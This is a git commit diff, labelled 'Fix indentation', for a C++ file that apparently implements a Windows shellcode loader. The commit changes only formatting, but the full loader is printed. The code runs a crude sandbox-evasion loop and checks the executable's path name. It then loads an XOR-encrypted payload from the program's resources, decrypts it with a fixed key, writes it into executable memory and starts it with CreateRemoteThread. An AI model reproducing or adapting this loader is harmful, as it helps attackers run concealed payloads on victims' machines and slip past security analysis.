95d4da7077fc7c2587954030cb5f5cf587a3ff79
Caue Borella <caueborella@gmail.com>
2023-10-28 10:44:32 +0800

    Fix indentation

--- Caue.cpp
+++ Caue.cpp
@@ -13,31 +13,30 @@ void shellcode();
 
 using namespace std;
 
-int main(int argc, char* argv[])
-{
+int main(int argc, char* argv[]) {
 	// Simple sanbox evasion
-    char path[MAX_PATH];
-    int cpt = 0;
-    int i = 0;
-    for (i = 0; i < MAX_OP; i++)
-    {
-        cpt++;
-    }
-    if (cpt == MAX_OP)
-    {
-        GetModuleFileName(NULL, path, MAX_PATH);
-        regex str_expr("(.*)(Caue)(.*)");
+	char path[MAX_PATH];
+    	int cpt = 0;
+    	int i = 0;
+	for (i = 0; i < MAX_OP; i++) 
+	{
+		cpt++;
+	}
 
-        if (regex_match(path, str_expr)) { // Check if the file path matches the regular expression pattern
-            shellcode(); 
-        }
-    }
-    return 0;
-}
+	if (cpt == MAX_OP)
+		{
+			GetModuleFileName(NULL, path, MAX_PATH);
+			regex str_expr("(.*)(Caue)(.*)");
+			if (regex_match(path, str_expr)) 
+			{ // Check if the file path matches the regular expression pattern
+				shellcode();
+			}
+		}
+	return 0;
+	}
 
 
 void shellcode() {
-	
 	// Load shellcode from resources
 	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(SHELLCODE_RESOURCE), RT_RCDATA);
 	HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeResource);
@@ -51,31 +50,31 @@ void shellcode() {
 	// XOR Decrypt the shellcode
 	char key[] = "ABCD";
 	int j = 0;
-	for (int i = 0; i < shellcodeSize; i++) {
+	for (int i = 0; i < shellcodeSize; i++) 
+	{
 		if (j == sizeof(key) - 1) j = 0;
-
 		dataCopy[i] = dataCopy[i] ^ key[j];
 		j++;
 	}
 	
 	// Get the ID of the current process
-    DWORD pnameid = GetCurrentProcessId(); 
+	DWORD pnameid = GetCurrentProcessId(); 
 	
 	// Open the current process with all access rights
-    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid);
+	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid);
 	
 	// Allocate memory the size of the shellcode
-    PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     
 	// Write the shellcode to the remote buffer
 	WriteProcessMemory(processHandle, remoteBuffer, dataCopy, shellcodeSize, NULL);
 	
 	// Create a remote thread
-    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
 	
 	// Cleanup
-    CloseHandle(processHandle);
+	CloseHandle(processHandle);
 	delete[] dataCopy;
 
-    system("pause");
+	system("pause");
 }
